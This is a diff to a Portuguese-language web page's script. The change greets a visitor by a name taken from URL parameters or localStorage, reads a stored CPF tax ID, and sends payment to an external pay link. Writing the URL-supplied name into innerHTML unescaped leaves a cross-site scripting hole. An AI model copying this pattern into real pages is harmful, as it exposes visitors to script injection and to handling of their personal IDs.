@@ -454,26 +454,37 @@
   </style>
 
   <script>
-    // Obter dados do localStorage
-    let nomeCompleto = "Nome não informado";
+    // --- LÓGICA DO NOME MODIFICADA ---
+    // Obter dados do usuário de múltiplas fontes
+    
+    let nomeCompleto = "Visitante"; // Valor padrão
     let cpf = "";
+    const params = new URLSearchParams(window.location.search);
 
-    try {
-      const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-      if (dadosUsuario) {
-        nomeCompleto = dadosUsuario.nome || "Nome não informado";
-        cpf = dadosUsuario.cpf || "";
-      }
-      console.log('Dados carregados do localStorage:', dadosUsuario);
-    } catch (error) {
-      console.error('Erro ao carregar dados do localStorage:', error);
-      // Fallback para URL se localStorage não funcionar
-      const params = new URLSearchParams(window.location.search);
-      nomeCompleto = params.get("nome") || "Nome não informado";
+    // 1. Tenta obter o nome da URL, verificando por 'name' e depois por 'nome'
+    const nomeDaUrl = params.get("name") || params.get("nome");
+    if (nomeDaUrl) {
+        nomeCompleto = nomeDaUrl;
     }
 
+    // 2. Tenta obter os dados do localStorage (pode sobrescrever os da URL se existirem)
+    try {
+        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+        if (dadosUsuario) {
+            // Se o localStorage tiver um nome, ele tem prioridade sobre a URL e o valor padrão
+            nomeCompleto = dadosUsuario.nome || nomeCompleto;
+            cpf = dadosUsuario.cpf || "";
+        }
+        console.log('Dados do localStorage carregados:', dadosUsuario);
+    } catch (error) {
+        console.error('Erro ao carregar dados do localStorage:', error);
+        // O nome da URL (se existir) já foi carregado, então não é preciso fazer nada extra
+    }
+
+    // Pega apenas o primeiro nome para a saudação
     const primeiroNome = nomeCompleto.trim().split(" ")[0];
 
+    // Atualiza os elementos na página com o nome encontrado
     document.querySelector(".user-name").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`;
     document.querySelector(".alert strong").textContent = nomeCompleto;
 
@@ -507,7 +518,7 @@
       }, 30);
     }
 
-    // --- CÓDIGO MODIFICADO AQUI ---
+    // --- LÓGICA DO PAGAMENTO MODIFICADA ---
     function efetuarPagamento() {
         // URL de destino
         const baseUrl = 'https://pay.ultimo-passo.space/rn4RgQvqkRb3wBV';
